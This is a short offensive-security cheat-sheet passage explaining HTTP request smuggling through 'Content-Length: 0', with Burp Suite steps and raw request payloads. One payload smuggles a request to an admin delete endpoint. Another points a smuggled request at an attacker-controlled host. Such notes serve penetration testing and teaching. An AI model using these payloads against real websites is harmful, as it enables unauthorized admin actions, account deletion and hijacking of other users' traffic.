## Content-Length: 0

If the target website ignores the Content-Length, you’re able to access the restricted page by request smuggling.

### 1. Prepare the Two Same Requests

If you're using Burp Suite, send the target request to **Repeater** twice.

### 2. Change the First Request to POST Request

### 3. Set the "Content-Length: 0" in the First Request

### 4. Set the "Connection: keep-alive" in the First Request

Now two requests should look like:

```sh
# Request 1
POST / HTTP/1.1
Host: example.com
Cookie: key=value
Connection: keep-alive
Content-Length: 0

GET /admin/delete?username=john
Foo: x

# -------------------------------------------------

# Request 2
GET / HTTP/1.1
Host: example.com
Cookie: key=value
Connection: close
```

### 5. Send Requests in Order

First off, if you're using Burp Suite, note that **enabling the "Update Content-Length" in the Burp Repeater option.**
The sequence is Request 1 -> Request 2.

## HTTP/2 Content-Length: 0

### 1. Prepare Request

If you're using Burp Suite, note that **disable "Update Content-Length" and enable "Allow HTTP/2 ALPN override" in the Burp Repeater option.**

The request shoud look like:

```sh
POST / HTTP/2
Host: example.com
Content-Length: 0

GET /exploit HTTP/1.1
Host: attacker.com
Content-Length: 5

x=1
```

### 2. Send Request

Before doing, don't forget to **expand the Inspector on the right in the Repeater and select "HTTP/2".**  
Now send the request a few times.
